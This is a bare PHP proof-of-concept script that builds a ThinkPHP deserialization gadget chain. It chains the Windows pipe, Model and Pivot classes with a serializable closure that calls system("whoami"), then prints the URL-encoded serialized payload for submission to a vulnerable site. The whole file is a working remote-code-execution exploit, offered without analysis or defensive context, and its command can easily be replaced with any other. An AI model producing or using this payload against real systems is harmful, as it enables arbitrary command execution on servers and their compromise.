<?php
namespace think\process\pipes{
    class Windows{
        public function __construct($s){
            $this->files = array($s);
        }
    }

}

namespace think\model\concern{
    trait Conversion{
    }
    trait Attribute{	
    }
}

namespace think{
    class Model{
        use model\concern\Conversion;
        use model\concern\Attribute;
        private $data = ['test' => ""];
    	private $withAttr = [];			
    	function __construct($closure){
        	$this->withAttr = ['test' => $closure ];
        }
    }
}

namespace think\model{
    use think\Model;
    class Pivot extends Model{
    }
}

namespace{
	require __DIR__ . '/vendor/autoload.php';
	use Opis\Closure\SerializableClosure;
	$closure = new SerializableClosure(function(){system("whoami");});
    $string = new think\model\Pivot($closure);
    $payload = new think\process\pipes\Windows($string);
    echo urlencode(serialize($payload));
}